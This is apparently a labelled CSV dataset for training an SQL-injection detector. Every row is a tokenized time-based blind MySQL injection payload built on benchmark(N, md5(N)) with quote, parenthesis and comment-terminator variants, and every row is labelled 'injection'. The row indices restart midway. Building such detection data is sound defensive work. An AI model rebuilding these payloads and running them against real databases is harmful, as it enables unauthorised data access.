11,RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
12,SQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
13,SQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
14,SQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
15,DQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
16,DQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
17,DQUT RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
0,AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
1,AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
2,AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
3,SQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
4,SQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
5,SQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
6,DQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
7,DQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
8,DQUT AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
9,RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
10,RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
11,RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
12,RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
13,RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
14,RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
15,RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
16,RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
17,RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
18,RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
19,RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
20,RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
21,SQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
22,SQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
23,SQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
24,DQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
25,DQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
26,DQUT RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
27,SQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
28,SQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
29,SQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
30,DQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
31,DQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
32,DQUT RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
33,SQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
34,SQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
35,SQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
36,DQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
37,DQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
38,DQUT RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
39,SQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
40,SQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
41,SQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
42,DQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT SLSH STAR,injection
43,DQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT MINUS MINUS,injection
44,DQUT RPRN RPRN RPRN RPRN AND INT EQ benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN PRCNT INT PRCNT INT,injection
